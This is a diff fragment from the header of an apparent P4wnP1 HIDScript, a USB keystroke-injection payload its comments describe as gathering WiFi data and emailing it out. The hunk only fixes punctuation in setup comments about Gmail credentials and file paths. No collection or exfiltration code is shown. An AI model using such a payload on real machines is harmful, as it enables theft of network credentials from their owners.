@@ -1,6 +1,6 @@
 //P4wnP1 HiDscript - Gather WiFi data and email it.
 //Change line 25 and 45 ('Desktop') to location you want file saved
-//Change line 43 'GMAIL_USERNAME'<-username ONLY, ;GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
+//Change line 43 'GMAIL_USERNAME'<-username ONLY, 'GMAIL_PASSWORD', 'SENDER_EMAIL', 'RECEIVER_EMAIL'.
 //Change line 65 to set location file was saved
   
 layout('us');			// US keyboard layout
